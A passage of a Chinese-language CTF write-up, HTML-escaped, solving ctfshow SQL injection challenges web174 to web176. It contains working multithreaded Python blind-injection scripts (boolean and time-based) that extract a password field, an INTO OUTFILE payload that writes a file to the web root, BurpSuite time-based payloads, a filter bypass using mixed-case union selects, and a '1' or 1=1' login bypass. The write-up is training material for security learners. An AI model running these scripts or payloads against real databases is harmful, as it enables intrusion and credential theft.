# ★ i注入点、payload 模板写在配置区
PAYLOAD_TEMPLATE = &amp;quot;?id=1&amp;#39; and substr((select password from ctfshow_user4 where username=\&amp;quot;&amp;#123;user&amp;#125;\&amp;quot;),&amp;#123;pos&amp;#125;,1)=&amp;#39;&amp;#123;char&amp;#125;&amp;#39;--+&amp;quot;
SUCCESS_KEYWORD = &amp;quot;admin&amp;quot;  # ★ 判断正确的关键字
# =================== 配置区结束 ===================


def test_char(session, pos, ch):
    &amp;quot;&amp;quot;&amp;quot;测试某一位的某个字符&amp;quot;&amp;quot;&amp;quot;
    payload = PAYLOAD_TEMPLATE.format(user=TARGET_USER, pos=pos, char=ch)
    url_full = URL + payload
    try:
        res = session.get(url=url_full, timeout=5)
    except requests.exceptions.RequestException:
        return None

    if DEBUG:
        print(f&amp;quot;[DEBUG] pos=&amp;#123;pos&amp;#125;, try=&amp;#39;&amp;#123;ch&amp;#125;&amp;#39;&amp;quot;)

    if SUCCESS_KEYWORD in res.text:
        return ch
    return None


def extract_flag():
    flag = &amp;quot;&amp;quot;
    session = requests.Session()

    for i in range(1, MAX_LEN + 1):
        found = None

        # ★ 多线程跑这一位的所有候选字符
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = &amp;#123;executor.submit(test_char, session, i, ch): ch for ch in CHARSET&amp;#125;

            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    found = result
                    break

        if found:
            flag += found
            print(f&amp;quot;[+] 当前Flag: &amp;#123;flag&amp;#125;&amp;quot;)
        else:
            print(&amp;quot;[*] 爆破结束&amp;quot;)
            break

    return flag


if __name__ == &amp;quot;__main__&amp;quot;:
    result = extract_flag()
    print(f&amp;quot;\n最终Flag: &amp;#123;result&amp;#125;&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web175&#34;&gt;&lt;a href=&#34;#web175&#34; class=&#34;headerlink&#34; title=&#34;web175&#34;&gt;&lt;/a&gt;web175&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;查询语句
//拼接sql语句查找指定ID用户
$sql = &amp;quot;select username,password from ctfshow_user5 where username !=&amp;#39;flag&amp;#39; and id = &amp;#39;&amp;quot;.$_GET[&amp;#39;id&amp;#39;].&amp;quot;&amp;#39; limit 1;&amp;quot;;


返回逻辑
//检查结果是否有flag
    if(!preg_match(&amp;#39;/[\x00-\x7f]/i&amp;#39;, json_encode($ret)))&amp;#123;
      $ret[&amp;#39;msg&amp;#39;]=&amp;#39;查询成功&amp;#39;;
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;正则匹配过滤所有 ASCII 字符（从 &lt;code&gt;\x00&lt;/code&gt; 到 &lt;code&gt;\x7f&lt;/code&gt;，即 &lt;code&gt;0&lt;/code&gt; 到 &lt;code&gt;127&lt;/code&gt; 的所有字符，包括控制字符、数字、字母和符号）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将查询结果写入靶机服务器&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;1&amp;#39; union select 1,password from ctfshow_user5 into outfile &amp;#39;/var/www/html/1.php&amp;#39;--+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;访问 &lt;code&gt;靶机/1.php&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/1.php
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823224351059.png&#34; alt=&#34;image-20250823224351059&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;发现页面存在延时&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;1&amp;#39; and sleep(3)--+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;可以使用时间盲注脚本&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# ===================== 配置区 =====================
URL = &amp;quot;http://4bbc4f29-3d36-42b9-abc0-c10dd3b3d326.challenge.ctf.show/api/v5.php&amp;quot;
CHARSET = &amp;quot;0123456789abcdefghijklmnopqrstuvwxyz&amp;#123;&amp;#125;-&amp;quot;
TARGET_USER = &amp;quot;flag&amp;quot;
MAX_LEN = 50
THREADS = 10
DEBUG = False
TIME_THRESHOLD = 1  # 响应时间超过多少秒判定为正确字符
SLEEP_TIME = 1.5      # payload中sleep的秒数

# ★ payload模板改成时间盲注
PAYLOAD_TEMPLATE = &amp;quot;?id=1&amp;#39; and if(substr((select password from ctfshow_user5 where username=&amp;#39;&amp;#123;user&amp;#125;&amp;#39;),&amp;#123;pos&amp;#125;,1)=&amp;#39;&amp;#123;char&amp;#125;&amp;#39;, SLEEP(&amp;#123;sleep&amp;#125;), 0)--+&amp;quot;
# =================== 配置区结束 ===================

def test_char(session, pos, ch):
    &amp;quot;&amp;quot;&amp;quot;测试某一位的某个字符&amp;quot;&amp;quot;&amp;quot;
    payload = PAYLOAD_TEMPLATE.format(user=TARGET_USER, pos=pos, char=ch, sleep=SLEEP_TIME)
    url_full = URL + payload
    start = time.time()
    try:
        session.get(url=url_full, timeout=SLEEP_TIME + 2)
    except requests.exceptions.RequestException:
        return None
    elapsed = time.time() - start

    if DEBUG:
        print(f&amp;quot;[DEBUG] pos=&amp;#123;pos&amp;#125;, try=&amp;#39;&amp;#123;ch&amp;#125;&amp;#39;, time=&amp;#123;elapsed:.2f&amp;#125;s&amp;quot;)

    if elapsed &amp;gt;= TIME_THRESHOLD:
        return ch
    return None

def extract_flag():
    flag = &amp;quot;&amp;quot;
    session = requests.Session()

    for i in range(1, MAX_LEN + 1):
        found = None
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = &amp;#123;executor.submit(test_char, session, i, ch): ch for ch in CHARSET&amp;#125;
            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    found = result
                    break

        if found:
            flag += found
            print(f&amp;quot;[+] 当前Flag: &amp;#123;flag&amp;#125;&amp;quot;)
        else:
            print(&amp;quot;[*] 爆破结束&amp;quot;)
            break

    return flag

if __name__ == &amp;quot;__main__&amp;quot;:
    result = extract_flag()
    print(f&amp;quot;\n最终Flag: &amp;#123;result&amp;#125;&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解三&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用BurpSuite爆破&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆破数据库长度：11&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload插入点： &lt;code&gt;1&amp;#39; and if(length(database())=§1§,sleep(3),0)--+&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;1&amp;#39; and if(length(database())=1,sleep(3),0)--+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;1%27%20and%20if(length(database())=§1§,sleep(3),0)--+&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824152148641.png&#34; alt=&#34;image-20250824152148641&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824152251075.png&#34; alt=&#34;image-20250824152251075&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆破数据库名：&lt;code&gt;ctfshow_web&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload插入点：&lt;code&gt;1&amp;#39; and if(substr(database(),§1§,1)=&amp;#39;§a§&amp;#39;,sleep(5),1)--+&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;1&amp;#39; and if(substr(database(),1,1)=&amp;#39;a&amp;#39;,sleep(5),1)--+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;1%27%20and%20if(substr(database(),§1§,1)=%27§a§%27,sleep(5),1)--+&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824153401961.png&#34; alt=&#34;image-20250824153401961&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824153335073.png&#34; alt=&#34;image-20250824153335073&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆破表数量：1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;strong&gt;payload插入点：&lt;code&gt;1&amp;#39; and if((select count(table_name) from information_schema.tables where table_schema=&amp;#39;ctfshow_web&amp;#39;)=§1§,sleep(5),1)--+&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;1&amp;#39; and if((select count(table_name) from information_schema.tables where table_schema=&amp;#39;ctfshow_web&amp;#39;)=1,sleep(5),1)--+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;1%27%20and%20if((select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema=%27ctfshow_web%27)=§1§,sleep(5),1)--+&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824153801484.png&#34; alt=&#34;image-20250824153801484&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824153738062.png&#34; alt=&#34;image-20250824153738062&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆破表名长度：13&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload插入点：&lt;code&gt;1&amp;#39; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=§1§,sleep(5),1)--+&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;1&amp;#39; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=1,sleep(5),1)--+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;1%27%20and%20if(length((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1))=§1§,sleep(5),1)--+&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824161451417.png&#34; alt=&#34;image-20250824161451417&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824161413215.png&#34; alt=&#34;image-20250824161413215&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆破表名：&lt;code&gt;ctfshow_user5&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload插入点：&lt;code&gt;1&amp;#39; and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),§0§,1)=&amp;#39;§a§&amp;#39;,sleep(5),1)--+&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;1&amp;#39; and if((substr(select table_name from information_schema.tables where table_schema=database() limit 0,1),0,1)=&amp;#39;a&amp;#39;,sleep(5),1)--+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;1%27%20and%20if((substr(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),0,1)=%27a%27,sleep(5),1)--+&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824162241422.png&#34; alt=&#34;image-20250824162241422&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824162207412.png&#34; alt=&#34;image-20250824162207412&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆破flag&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload插入点：&lt;code&gt;1&amp;#39; and if(substr((select password from ctfshow_user5 where username=&amp;#39;flag&amp;#39;),§0§,1)=&amp;#39;§a§&amp;#39;,sleep(5),1)--+&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;1&amp;#39; and if(substr((select password from ctfshow_user5 where username=&amp;#39;flag&amp;#39;),0,1)=&amp;#39;§a§&amp;#39;,sleep(5),1)--+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;1%27%20and%20if(substr((select%20password%20from%20ctfshow_user5%20where%20username=%27flag%27),0,1)=%27a%27,sleep(5),1)--+&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824163750090.png&#34; alt=&#34;image-20250824163750090&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824163731570.png&#34; alt=&#34;image-20250824163731570&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web176&#34;&gt;&lt;a href=&#34;#web176&#34; class=&#34;headerlink&#34; title=&#34;web176&#34;&gt;&lt;/a&gt;web176&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;查询语句
//拼接sql语句查找指定ID用户
$sql = &amp;quot;select id,username,password from ctfshow_user where username !=&amp;#39;flag&amp;#39; and id = &amp;#39;&amp;quot;.$_GET[&amp;#39;id&amp;#39;].&amp;quot;&amp;#39; limit 1;&amp;quot;;


返回逻辑
//对传入的参数进行了过滤
  function waf($str)&amp;#123;
   //代码过于简单，不宜展示
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;过滤了 &lt;code&gt;select&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询列数为3&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;1&amp;#39; order by 3--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824170031112.png&#34; alt=&#34;image-20250824170031112&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;select&lt;/code&gt; 被过滤，使用大小写混合绕过&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询库名 &lt;code&gt;ctfshow_web&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union Select 1,2,database()--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824170106246.png&#34; alt=&#34;image-20250824170106246&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询表名，有一个表&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union Select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&amp;#39;ctfshow_web&amp;#39;--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824170233810.png&#34; alt=&#34;image-20250824170233810&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询列&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union Select 1,2,group_concat(column_name) from information_schema.columns where table_name=&amp;quot;ctfshow_user&amp;quot; --+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824170316143.png&#34; alt=&#34;image-20250824170316143&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询字段记录&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union Select 1,2,password from ctfshow_user--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824170349763.png&#34; alt=&#34;image-20250824170349763&#34; style=&#34;zoom:80%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;只查出 &lt;code&gt;username&lt;/code&gt; 为 &lt;code&gt;flag&lt;/code&gt; 的那一行&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union Select 1,2,password from ctfshow_user where username = &amp;#39;flag&amp;#39;--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824170557781.png&#34; alt=&#34;image-20250824170557781&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解三&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用万能密码&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;1&amp;#39; or 1=1--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824170645135.png&#34; alt=&#34;image-20250824170645135&#34; style=&#34;zoom: 25%;&#34; /&gt;

